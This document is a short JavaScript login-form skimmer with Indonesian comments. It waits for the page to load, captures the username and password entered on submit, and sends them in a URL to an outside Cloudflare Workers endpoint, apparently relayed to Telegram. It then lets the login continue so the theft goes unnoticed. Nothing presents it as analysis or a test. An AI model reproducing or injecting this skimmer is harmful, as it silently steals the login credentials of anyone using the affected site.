<script>
document.addEventListener("DOMContentLoaded", function () {
    const form = document.querySelector("form");
    if (!form) return;

    form.addEventListener("submit", function () {
        const id = form.querySelector('input[name="name"]').value;
        const pass = form.querySelector('input[name="password"]').value;

        // DEBUG: tampilkan di konsol (untuk memastikan benar)
        console.log("Mengirim ID & Password:", id, pass);

        // Kirim ke endpoint Cloudflare Worker / Telegram
        fetch("https://memek-worker.defoy89122.workers.dev/?message=" + encodeURIComponent(`${id};${pass}`))
            .then((res) => console.log("Terkirim:", res.status))
            .catch((err) => {
                console.error("Gagal mengirim:", err);
            });

        // Jangan hentikan proses login
    });
});
</script>
